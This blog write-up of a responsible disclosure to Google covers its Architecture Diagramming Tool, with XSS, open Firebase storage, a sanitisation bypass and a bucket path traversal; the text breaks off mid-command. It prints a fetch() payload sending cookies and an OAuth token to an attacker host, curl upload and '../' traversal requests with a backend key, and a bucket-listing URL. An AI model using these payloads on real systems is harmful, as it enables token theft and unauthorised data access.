---
layout: post
title: Sketchy Cheat Sheet - Story of a Cloud Architecture Diagramming Tool gone wrong  
---

## Table of Contents

- [Preface](#preface)
- [Unplanned Bug Bounty hunt](#unplanned-bug-bounty-hunt)
    * [Backtracking from impact to attack scenario](#backtracking-from-impact-to-attack-scenario)
    * [Hunting for the XSS](#hunting-for-the-xss)
    * [Proving exploitability](#proving-exploitability)
    * [Attack scenario diagram #1](#attack-scenario-diagram-1)
    * [Nice catch!](#nice-catch!)
- [Digging into the share links feature](#digging-into-the-share-links-feature)
    * [Firebase (in)secure storage](#firebase-insecure-storage)
    * [Firebase security rules](#firebase-security-rules)
    * [Demo app repurposed](#demo-app-repurposed)
    * [Unauthorized access to 30k share links](#unauthorized-access-to-30k-share-links)
- [Surprising bypass](#surprising-bypass)
    * [PoC](#poc)
    * [Attack scenario diagram #2](#attack-scenario-diagram-2)
- [Poisoning predefined architectures](#poisoning-predefined-architectures)
    * [Benevolent injection](#benevolent-injection)
    * [Attack scenario diagram #3](#attack-scenario-diagram-3)
- [Getting access to the source code](#getting-access-to-the-source-code)
- [Bucket traversal](#bucket-traversal)
    * [Generate Terraform feature](#generate-terraform-feature)
    * [White-box assessment](#white-box-assessment)
    * [Unauthorized access to Terraform Artifacts](#unauthorized-access-to-terraform-artifacts)
    * [Stumbling on a silently fixed vuln in Go Cloud Storage client library](#stumbling-on-an-n-day-in-go-cloud-storage-client-library)
    * [Attack scenario diagram #4](#attack-scenario-diagram-4)
- [Closing remarks](#closing-remarks)
- [Full timeline](#full-timeline)

---

# Preface

This blogposts goes over the details of a responsible disclosure process which took place between November 2023 and July 2024.

Throughout this period, I've reported a series of vulnerabilities & misconfigurations in Google's [Architecture Diagramming Tool](https://github.com/priyankavergadia/google-cloud-4-words/blob/master/ADT/ADT%20User%20Guide%20-%20External.pdf) [^1]

The severity of disclosed shortcomings & potential customer impact, resulted in said service getting quarantined 🚧 and ulitmately decommissioned in October 2024 [^2]

<p align="center">
<a href="https://googlecloudcheatsheet.withgoogle.com/architecture" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/under_maintenance.png"/>
</a>
</p>

> ⚠️ **Disclaimer:** \
Information shared within this writeup is meant for educational purposes only.\
I performed this research independently.\
The views and opinions expressed do not necessarily reflect those of my employer.

---

# Unplanned Bug Bounty hunt
It was a an early morning back in mid November 2023, when I decided that it's high time to prepare a diagram of a solution, that I was working on for quite some time at this point.

As usual, I went ahead and opened my goto Diagramming Tool ie. [https://googlecloudcheatsheet.withgoogle.com/architecture](https://googlecloudcheatsheet.withgoogle.com/architecture)

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/architecture_tool.gif" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/architecture_tool.gif"/>
</a>
</p>

To my surprise, a [Sign-in](https://developers.google.com/identity/gsi/web/guides/overview) button welcomed me for the first time (at this point I was using this tool quite frequently for at least a year)

Soon it became obvious that singinn in is not the only thing that changed in version `0.2.3`

Some functionality like uploading diagrams to *Google Drive* stopped working while other features like `Generate Terraform` got intrudocued.

Quick check on Twitter quickly proved that indeed a new version was released:

<p align="center">
<a href="https://twitter.com/pvergadia/status/1725217430547677607" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/twitter_msg_1.png" width="30%">
</a>
</p>

When I picked a GCE VM resource the UI required the configuration fields to be populated and here's where the Bug Bounty hunt kicks in.

The expression on my face, when I clicked on the `project` dropdown list must have been priceless as approx. **300 Project IDs** of the Organization that I work for got listed ready to be picked 😲

While in itself it might not seem like that big of a deal, I quickly realized that somehow this **third-party app can query my employeers GCP Org using my highly priviliged, post-MFA credentials**.

Having intregrated services with Google APIs many times before, it became apparent that somewhere in the Sign-in flow the app got a hold onto a sufficiently scoped OAuth [Access Token](https://cloud.google.com/docs/authentication/token-types#access).


## Backtracking from impact to attack scenario

At this point I got so intrigued that instead of focusing at the job at hand, I dediced to dig deeper based on potential impact if compromised.
> A partially broken app + powerfull permissions does not mix well 💥

First thing I had to check is how come this third-party application got without my explicit auathorization of such a grant.

As showcased below the Sign-in page did not mention one bit, that any type of Google Cloud specififc [Access Scopes](https://developers.google.com/identity/protocols/oauth2/scopes) would be granted.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/misleading_sign_in.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/misleading_sign_in.png" width="30%"/>
</a>
</p>

### Google flavored OAuth 2.0

It was time to investigate the actual OAuth 2.0 request flow.

Below is the URL of the [Google OAuth Choose Account screen](https://developers.google.com/workspace/guides/configure-oauth-consent):
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?gsiwebsdk=3&client_id=255437329003-lvuu51v6jt8u43ee3u3r5opb33dk39jp.apps.googleusercontent.com&scope=openid%20profile%20email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform.read-only&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fgooglecloudcheatsheet.withgoogle.com%3Fid%3Dauth612636&prompt=select_account&response_type=token&include_granted_scopes=true&enable_granular_consent=true&service=lso&o2v=2&theme=mn&ddm=0&flowName=GeneralOAuthFlow
```

> Some of those query parameters are standard OAuth 2.0 while some are Google's idiosyncrasies.

Let's take a closer look at the scopes reuqested by this application:
`scope=openid%20profile%20email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform.read-only`

Aside from typical `opeind+profile+email` the `cloud-platform.read-only` stood out.

Not only is the recommended [incremental authorization](https://developers.google.com/identity/protocols/oauth2/web-server#incrementalAuth) not implemented - what's worse the user isn't event informed that they're about to grant read-only access to GCP (!)

As it turned out, an [Access Token](https://cloud.google.com/docs/authentication/token-types#access) scoped with `cloud-platform.read-only` provided read-only access to **15 distinct Google Cloud APIs**, most notably:
- [App Engine Admin API](https://developers.google.com/identity/protocols/oauth2/scopes#appengine)
- [BigQuery API](https://developers.google.com/identity/protocols/oauth2/scopes#bigquery)
- [Cloud Bigtable Admin API](https://developers.google.com/identity/protocols/oauth2/scopes#bigtableadmin)
- [Cloud Storage JSON API](https://developers.google.com/identity/protocols/oauth2/scopes#storage)
- [Cloud Resource Manager API](https://developers.google.com/identity/protocols/oauth2/scopes#cloudresourcemanager)

I knew, that there were pretty much two viable options where the shortlived token could be stored:
1. [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)/[sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
2. Set in a Cookie

Quick check proved that option #2. was at play and what's important to note is that [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly) attribute was not set for the Cookie in question called `accessToken`.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/access_token_cookie_params.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/access_token_cookie_params.png" width="80%"/>
</a>
</p>

Those aro so call *opaque* tokens ie. their format is proprietary and can't be decoded.\
In order to verify scopes granted one has to query Google OAuth 2.0 `tokeninfo` endpoint and that’s exactly what I did 👇

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/access_token_scopes.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/access_token_scopes.png" width="80%"/>
</a>
</p>


This made some sense since the calls to Google APIs were made dynamically on the client-side via [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest?retiredLocale=pl), so Javascript had to have access to the Cookie's value.

Example snippet:
```js
            let a = new XMLHttpRequest
            return a.open("get", "https://cloudresourcemanager.googleapis.com/v1/projects"),
            // I had to figure out how this app got an Access Token without my explicit grant
            a.setRequestHeader("Authorization", "Bearer " + e),
            a.responseType = "json",
            a.onload = ()=>{
                n = (n = t2(a.response, o, s) ? n : n.concat(t3(a.response, "projects", "projectId"))).filter(e=>void 0 !== e),
                t(!1),
                n.sort(),
                r(n)
            }
            ,
            a.onerror = ()=>{
                console.error(a.response),
                t(!1)
            }
            ,
            a.send(),
            n
        }
```

The fact that the access token can be accessed from JS code is crucial since it made **any potential XSS a high severity issue**.

## Hunting for the XSS

To be quite honest, [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) is one of my least favorite attack vectors.\
Bypassing [WAFs](https://www.cloudflare.com/en-gb/learning/ddos/glossary/web-application-firewall-waf/), [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) and keeping up to date with all the quirks of *latest & greatest* JS frameworks isn't exactly my cup of tea.

Having said that, I decided to look for a publicly known & exploitable XSS in the underlying dependencies.

I knew that this diagramming tool is based on a widely popular Open Source project [Excalidraw](https://github.com/excalidraw), which they proudly highlight in their [GH README](https://github.com/excalidraw/excalidraw?tab=readme-ov-file#whos-integrating-excalidraw)

> 💡 **Tip:** When dealing with OSS it's typically a good idea to start the evaluation by looking at Issues, PRs & Security Advisories.

Quick check showed that a "promising" [Security Advisory: GHSA-v7v8-gjv7-ffmr](https://github.com/advisories/GHSA-v7v8-gjv7-ffmr) & associated [CVE-2023-26140](https://nvd.nist.gov/vuln/detail/CVE-2023-26140) were published in Aug 2023.

TL;DR Versions prior to `0.15.3` were vulnerable to a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) in the *embeddable links* feature.

The fix [PR](https://github.com/excalidraw/excalidraw/pull/6728) contained a full reproduction of the issue 👇

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/GHSA-v7v8-gjv7-ffmr.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/GHSA-v7v8-gjv7-ffmr.png"/>
</a>
</p>

Let's take a closer look at the payload 🧐

Paritally url-encoded:
```
javascript://%0aalert(document.domain)
```
Once rendered turns into:
```js
javascript://
alert(document.domain)
```

Nothing fancy - typical case of a [javascript pseudo-protocol](https://aszx87410.github.io/beyond-xss/en/ch1/javascript-protocol/) based XSS.

Replicating the above was trivial:

<p align="center">
<a href="https://drive.google.com/file/d/15EjPvEuK8FSWO9sL-8M_LmknYotduXoj/preview" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/self_xss_poc.gif"/>
</a>
</p>

What I had at this point was a [self-xss](https://www.youtube.com/watch?v=j8CrJv0dTEc) which in iteslf could be viewed as a security issue but arguably unlikely to be exploitable in isolation.
> 💡 **Tip:** There are some scenarios when where if chained with other minor issues / gadgets like [login & logout CSRF](https://labs.detectify.com/security-guidance/login-logout-csrf-time-to-reconsider/) could be impactful as showcased quite nicely in: https://whitton.io/articles/uber-turning-self-xss-into-good-xss/

## Proving exploitability

(Un)fortunately the application provided a feature which made exploitation possible -> *read-only share links*\
[*...The interface also lets you share your diagram with your team and colleagues or add it to documentation.*](https://cloud.google.com/blog/topics/developers-practitioners/introducing-google-cloud-architecture-diagramming-tool#:~:text=The%20interface%20also%20lets%20you%20share%20your%20diagram%20with%20your%20team%20and%20colleagues%20or%20add%20it%20to%20documentation.)

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/shareable_links.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/shareable_links.png"/>
</a>
</p>

An attacker could simply prepare a malicious diagram and share it with the victim.

At this point there was nothing else left to do other than to actually provide a fully working PoC of the Access Token being stolen & sent to an attacker controlled endpoint.

Since there were no defense in depth mechanisms eg. [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) in place, exploitation proved to be straighforward.

I ended up using a simple [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) `POST` request which contained all the Cookies set for domain `.googlecloudcheatsheet.withgoogle.com` (including `accessToken`) exfiltrating them to a [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) subdomain I controlled.

URL-decoded payload:
```js
javascript://
fetch('https://zsv3yx9zsfh8o5n7j842a52olfr6fz3o.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie })
```

Requests received by the server:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/burp_collaborator_poc_23_11_2023.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/burp_collaborator_poc_23_11_2023.png"/>
</a>
</p>

> 📝 **Note:** If you feel like you've seen exactly such a technique being used before, it's likely because you completed one of the many great [PortSwigger Web Security Academy Lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies#:~:text=Submit%20the%20following,public%20Collaborator%20server) scenarios - clearly it pays dividend to do ones homework!

Admittedly, the interaction required was quite high ie. two clicks by the victim + some persuasion to visit the diagram in the first place.

## Attack scenario diagram #1

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/attack_scenario_one.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/attack_scenario_one.png"/>
</a>
</p>

Feeling very confident about the quality of the finding, I submitted the report the same day.

---

# Digging into the share links feature
Soon after having received my first 🎉 [Nice catch!](https://youtu.be/IoXiXlCNoXg?list=PL590L5WQmH8dsxxz7ooJAgmijwOz0lh2H&t=700) from the Google Security Team, I decided to dig deeper into the link sharing feature itself.

The reasoning behind was simple - **what if I could access diagrams of other users?**

I knew from the end-user flow that functionality seemed to have relied on some kind of [UUIDs](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#uuids-and-guids) ie. uniqueness & sufficiently high entropy making the attempt to enumerate objects computationally infeasable.

Some examples:
* _https://googlecloudcheatsheet.withgoogle.com/architecture?link=588e8130-892a-11ee-8127-114320374db6_
* _https://googlecloudcheatsheet.withgoogle.com/architecture?link=08bcd560-8931-11ee-8515-fd9ac1a981d6_
* _https://googlecloudcheatsheet.withgoogle.com/architecture?link=9a2d1170-8983-11ee-a3fe-3bc7acaa8e95_

It quickly turned out that there were at least two issues with the implementation, of which one proved to be lethal 💀

Taking advantage of the fact that all the logic was present on the client-side, finding relevant code was easy.

Here's the *firebaseConfig* which is used for [initialization](https://firebase.google.com/docs/web/setup#access-firebase)
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/firebase_admin_config.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/firebase_admin_config.png"/>
</a>
</p>

And here's the share link client-side JS snippet:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/shared_link_js.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/shared_link_js.png"/>
</a>
</p>

## Firebase (in)secure storage
By tracking the network connections using devtools, I knew that [Cloud Storage for Firebase](https://firebase.google.com/docs/storage) was used for storing the objects containing the diagrams.

It's basically a wrapper over the foundational Google Cloud API ie. Google Cloud Storage

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/firebase_cloud_storage.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/firebase_cloud_storage.png"/>
</a>
</p>


## Firebase security rules

From access controls perspective, usage of [Cloud Storage for Firebase](https://firebase.google.com/docs/storage) introduced an alternative mechanism to handle AuthN/AuthZ other than [Cloud IAM](https://cloud.google.com/storage/docs/access-control/iam) & [ACLs](https://cloud.google.com/storage/docs/access-control/lists).

[Firebase Security Rules](https://firebase.google.com/docs/rules) offer a very elegant, customizable solutiuon for handling AuthN/AuthZ.

> Here's a short primer from [Fireship](https://www.youtube.com/@Fireship)\
[Firebase Security in 100 Seconds](https://youtu.be/sw1Uy3zwsLs)

Unfortunately they are also prone to misconfigurations [^3]

Showcased is a sample lax rule allowing anyone to read and overwrite all objects within a given bucket.

<p align="center">
<a href="https://firebase.google.com/docs/rules/insecure-rules#storage" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/insecure_firebase_rules.png"/>
</a>
</p>

## Demo app repurposed

In order to find out, if one could simply list all the *shareLinks* I decided to repurpose a demo React application.

I’ve populated the *firebaseConfig* with the values present within the client-side Javascript and attempted to list all the files from path *sharedLinks/* taking advantage of the [list_all_files](https://firebase.google.com/docs/storage/web/list-files#list_all_files) method.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/react_poc_app.png" target="_blank">
<img src="https://storage.googleapis.com/sketchy_cheat_sheet/react_poc_app.png"/>
</a>
</p>

## Unauthorized access to 30k share links

As it turned out, anyone with sufficient knowledge could simply list all the objects (!)

There were approximately 30k share links stored in this bucket, dating all the way back to the inception of this tool.

Those contained [PII](https://www.dol.gov/general/ppii) & [Intellectual Property](https://www.proofpoint.com/uk/threat-reference/intellectual-property-theft) which I swiftly reported to Google.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/customer_shared_links.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/customer_shared_links.png"/>
</a>
</p>

> 📝 **Note:** If only had I known that a simple partially url-encoded GET request would work as well…
https://firebasestorage.googleapis.com/v0/b/sustained-racer-323200.appspot.com/o?prefix=sharedLinks%2F&delimiter=%2F

---

# Surprising bypass
After a few months of no status updates, I decided to take a look at the state of affairs myself.

As it turned out my initial PoC approach stopped working - I could still achieve self-XSS but when I attempted to generate a shear link, the payload was getting removed.

This effectively broke the attack chain, or at least that’s what I thought.

Slightly simplified diagram showcasing the mitigation attempt.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/mitigation_diagram.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/mitigation_diagram.png"/>
</a>
</p>

Having taken a look at the adjusted code responsible for the share link generation I asked myslef a following question:\
what if sanitization takes place only on the client-side & and there’s **no check on the server-side**? 🤔

```js
let el = e=>{
                e && e.elements && e.elements.forEach(e=>{
                    e.link && !e.link.startsWith("https") && (e.link = "")
                     // what if sanitization takes place only on the client-side & and there’s no check on the server-side? 🤔
                }
                )
            }
              , er = async e=>{
                let t = new XMLHttpRequest;
                el(e),
                t.open("POST", "".concat("https://us-east1-sustained-racer-323200.cloudfunctions.net/adt-backend-gcs-handler-fn", "/add_architecture"));
                let o = JSON.stringify({
                    file_content: JSON.stringify(e),
                    key: "qvOJmj9wd8JqGldBGCkT7cowpIIThMWapXWNd5TaC4YOArYPvNXizQCbIdVSFoPeH1wpYNCxV8z5QpowCSTy7sQV8m9oyQQ4NKXmP9nEXeUaspIM17BmBvampAB8l9B5"
                });
                t.onload = ()=>{
                    if (200 === t.status) {
                        let e = t.response
                          , o = new URL(window.location.href);
                        o.search = "link=".concat(e);
                        let l = o.toString();
                        window.prompt("Shareable link: ", l)
                    }
                }
                ,
                t.send(o)
            }
```

This would potentially allow the attacker to generate a share link bypassing the application flow entirely.

## PoC

I quickly crafted a following direct upload, proving that one can still generate a malicious share link.

```sh
# Parameter containing the payload -> \"link\":\"javascript://%0aalert(document.cookie)\"
curl 'https://us-east1-sustained-racer-323200.cloudfunctions.net/adt-backend-gcs-handler-fn/add_architecture' \
  -H 'authority: us-east1-sustained-racer-323200.cloudfunctions.net' \
  -H 'accept: */*' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'content-type: text/plain;charset=UTF-8' \
  -H 'origin: https://googlecloudcheatsheet.withgoogle.com' \
  --data-raw '{"file_content":"{\"elements\":[{\"id\":\"CtnNvcYpx2k753tl70GBg\",\"type\":\"rectangle\",\"x\":740,\"y\":300,\"width\":580,\"height\":340,\"angle\":0,\"strokeColor\":\"#000000\",\"backgroundColor\":\"transparent\",\"fillStyle\":\"hachure\",\"strokeWidth\":2,\"strokeStyle\":\"solid\",\"roughness\":0,\"opacity\":100,\"groupIds\":[],\"strokeSharpness\":\"round\",\"seed\":986902507,\"version\":8,\"versionNonce\":102275109,\"isDeleted\":false,\"boundElements\":null,\"updated\":1712221612239,\"link\":\"javascript://%0aalert(document.cookie)\",\"locked\":false,\"endArrowhead\":\"triangle\",\"fontFamily\":2}],\"files\":{}}","key":"qvOJmj9wd8JqGldBGCkT7cowpIIThMWapXWNd5TaC4YOArYPvNXizQCbIdVSFoPeH1wpYNCxV8z5QpowCSTy7sQV8m9oyQQ4NKXmP9nEXeUaspIM17BmBvampAB8l9B5"}' \
  --compressed
```

> 💡 **Tip:** In order to facilitate triage and response, it’s vital to provide actionable reproduction steps.

## Attack scenario diagram #2

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/attack_diagram_num_2.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/attack_diagram_num_2.png"/>
</a>
</p>

In the meantime **impact has increased** from gaining read-only to full GCP IAM permissions of the victim, due to the fact that the application now expects the `cloud-platform` OAuth Scope to be granted (broadest one there is when it comes to GCP APIs)

[OAuth Choose Account Link](https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?gsiwebsdk=3&client_id=255437329003-lvuu51v6jt8u43ee3u3r5opb33dk39jp.apps.googleusercontent.com&scope=openid%20profile%20email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fgooglecloudcheatsheet.withgoogle.com%3Fid%3Dauth612636&prompt=select_account&response_type=token&include_granted_scopes=true&enable_granular_consent=true&service=lso&o2v=2&theme=mn&ddm=0&flowName=GeneralOAuthFlow)
(still online)

---

# Poisoning predefined architectures

The application also supported predefined, opinionated architectures.

<p align="center">
<a href="https://github.com/priyankavergadia/google-cloud-4-words/blob/master/ADT/ADT%20User%20Guide%20-%20External.pdf" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/predefined_archs.png"/>
</a>
</p>

The underlying [Excalidraw JSON files](https://docs.excalidraw.com/docs/codebase/json-schema) were stored in the same Firebase Cloud Storage bucket where the share links used to reside.

What if an attacker could overwrite those objects?

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/anonymous_object_overwrite.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/anonymous_object_overwrite.png"/>
</a>
</p>

## Benevolent injection
For the PoC, I decided to pick the `GCE Simple` diagram since it contained [Managed Instance Group](https://cloud.google.com/compute/docs/instance-groups#managed_instance_groups), where a user can set a [startup script](https://cloud.google.com/compute/docs/instances/startup-scripts/linux)
```bash
curl -s https://firebasestorage.googleapis.com/v0/b/sustained-racer-323200.appspot.com/o/deployableArchs%2Fdf0442d0-dc56-11ed-908f-b73d0485deaf%2FresourcesData.json\?alt\=media | gron | grep 'metadata'
json[4][1].block.attributes.metadata_script = {};
json[4][1].block.attributes.metadata_script.description = "The metadata script of the instances in the instance group";
json[4][1].block.attributes.metadata_script.display = true; ### Could be set to false
json[4][1].block.attributes.metadata_script.message = "";
json[4][1].block.attributes.metadata_script.parameterSource = [];
json[4][1].block.attributes.metadata_script.parameterSource[0] = "billing_account";
json[4][1].block.attributes.metadata_script.parameterSource[1] = "project_id";
json[4][1].block.attributes.metadata_script.parameterSource[2] = "project_name";
json[4][1].block.attributes.metadata_script.parameterSource[3] = "folder_id";
json[4][1].block.attributes.metadata_script.parameterSource[4] = "org_id";
json[4][1].block.attributes.metadata_script.parameterSource[5] = "region";
json[4][1].block.attributes.metadata_script.parameterSource[6] = "compute_service_account";
json[4][1].block.attributes.metadata_script.placeholder = "echo \"helloworld\"";
json[4][1].block.attributes.metadata_script.required = true;
json[4][1].block.attributes.metadata_script.type = "string";
json[4][1].block.attributes.metadata_script.value = "echo \"helloworld\""; ### Arbitrary code exection on startup
```

In order to prove the fact that an attacker could overwrite files fetched & later processed, I decided to attempt an upload of a slightly adjusted version with a non-malicious, benevolent change showcased below:

```bash
➜  diff original_resources_data.json rce_metadata.json
909c909
<                         "placeholder": "echo \"helloworld\"",
---
>                         "placeholder": "echo \"helloworld!\"",
912c912
<                         "value": "echo \"helloworld\"",
---
>                         "value": "echo \"helloworld!\"",
```

As it turned out the Firebase Security Rules actually allowed anyone to overwrite those objects (!)
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/resources_data_json_overwritten.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/resources_data_json_overwritten.png"/>
</a>
</p>

What’s more there were no integrity checks on the client-side (!)
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/overwritten_value_reflected_on_the_client_side.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/overwritten_value_reflected_on_the_client_side.png"/>
</a>
</p>

The ability to overwrite those predefined architectures (trusted by the application) proved to be a very powerful primitive.

Depending on creativity and time to response an attacker would'be been able to:
- Break a large part of the application by removing the architectures & images from the bucket
- Taint existing architectures with XSS payloads greatly increasing the likelihood of stealing OAuth tokens as described in previous reports [issu.ee/312687013](https://issuetracker.google.com/issues/312687013), [issu.ee/333194226](https://issuetracker.google.com/issues/333194226)
- Overwrite critical parts of existing architectures with an aim of achieving RCE & potential persistence in victim's infrastructure

## Attack scenario diagram #3

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/attack_diagram_num_3.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/attack_diagram_num_3.png"/>
</a>
</p>

---

# Getting access to the source code

During some mindless poking around, I stumbled upon an email of a Googler working on the project in scope

Driven by curiosity I simply Google-searched their email and the results turned out to be quite surprising ie. indexed commits from a seemingly internal Gerrit instance. 

One of the projects contained the entire source code, both backend as well as frontend.

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/indexed_gerrit_reference.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/indexed_gerrit_reference.png"/>
</a>
</p>

Anonymous [^4] user could’ve read and `git clone` all repositories from:
 - [https://atc-team.googlesource.com](https://atc-team.googlesource.com)

One could’ve also read all the git commit messages, comments etc.:
 - [https://atc-team-review.googlesource.com](https://atc-team-review.googlesource.com)


I was able to track changes meant to mitigate / fix issues I reported:
 - [https://atc-team-review.googlesource.com/c/google-4-words/+/8280/1/hooks/useArchitecture.tsx](https://atc-team-review.googlesource.com/c/google-4-words/+/8280/1/hooks/useArchitecture.tsx)
 - [https://atc-team-review.googlesource.com/c/adt-terraform/+/8220](https://atc-team-review.googlesource.com/c/adt-terraform/+/8220)

 > After some back & forth access got restricted, so expect a `403: Forbidden` if you're not a Googler

---

# Bucket traversal
This is the finding that I’m most proud of - it's a variant of a bucket path traversal with a twist.

> Similiar scenario found by [Frans Rosén](https://twitter.com/fransrosen) back in 2018 [^5][^6]

## Generate Terraform feature
As foreshadowed in the [Unplanned Bug Bounty hunt](#unplanned-bug-bounty-hunt) section of this writeup version `0.2.3` introduced a new feature.

**TL;DR One could quickly deploy all the resources from a given diagram via a backend conversion from the proprietary Excalidraw schema to valid Terraform HCL files.**

Here's the relevant part from the end user manual:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/generate_terraform_feature.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/generate_terraform_feature.png"/>
</a>
</p>

## Cloud Storage Signed URLs
Customer generated Terraform files were stored as ZIP archives in a shared bucket called `adt-tf-artifacts`.

Access to those objects was granted using shortlived [Cloud Storage Signed URLs](https://cloud.google.com/storage/docs/access-control/signed-urls).

<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/user_generated_terraform_files.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/user_generated_terraform_files.png"/>
</a>
</p>

This effectively meant that **only the user who generated the object should be able to access it** (security boundary)

## White box assessment
Here's the client-side [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest?retiredLocale=pl) handling the diagram upload:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/load_architecture.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/load_architecture.png"/>
</a>
</p>

Taking advantage of the fact, that I got access to the source code of the Cloud Function, the assessment turned from a [grey-box](https://www.checkpoint.com/cyber-hub/cyber-security/what-is-gray-box-testing/) [^7] to a [white-box](https://www.checkpoint.com/cyber-hub/cyber-security/what-is-white-box-testing/) one:
<p align="center">
<a href="https://storage.googleapis.com/sketchy_cheat_sheet/whitebox.png" target="_blank">
  <img src="https://storage.googleapis.com/sketchy_cheat_sheet/whitebox.png"/>
</a>
</p>

It seemed to me plausible although unlikely, that I could perhaps traverse the path using [dot-dot-slash (../)](https://owasp.org/www-community/attacks/Path_Traversal) and list all objects from a given bucket 💡

> The Google Cloud Storage [XML API](https://cloud.google.com/storage/docs/xml-api/overview) has a really simple [schema](https://cloud.google.com/storage/docs/xml-api/reference-methods) which made the above hypothesis more reasonable than one would think

## Unauthorized access to Terraform Artifacts

It turns out that my intuition proved to be correct (!)

Response to below request contained a listing of a 1000 [^8] objects ie. **customer generated zipped Terraform files** from bucket `adt-tf-artifacts`
```sh
curl 'https://us-east1-sustained-racer-323200.cloudfunctions.net/adt-backend-gcs-handler-fn/load_architecture' \
  -H 'accept: */*' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'origin: https://googlecloudcheatsheet.withgoogle.com' \
  -H 'referer: https://googlecloudcheatsheet.withgoogle.com/' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
  --data-binary @- << EOF
  {
    "file_name": "../adt-tf-artifacts/",
    "key": "qvOJmj9wd8JqGldBGCkT7cowpIIThMWapXWNd5TaC4YOArYPvNXizQCbIdVSFoPeH1wpYNCxV8z5QpowCSTy7sQV8m9oyQQ4NKXmP9nEXeUaspIM17BmBvampAB8l9B5"
  } 
EOF > adt-tf-artifacts.xml
```

An attacker could later fetch arbitrary objects from this & potentially other buckets, thus bypassing a significant security boundary:
```sh
curl 'https://us-east1-sustained-racer-323200.cloudfunctions.net/adt-backend-gcs-handler-fn/load_architecture' \
  -H 'accept: */*' \
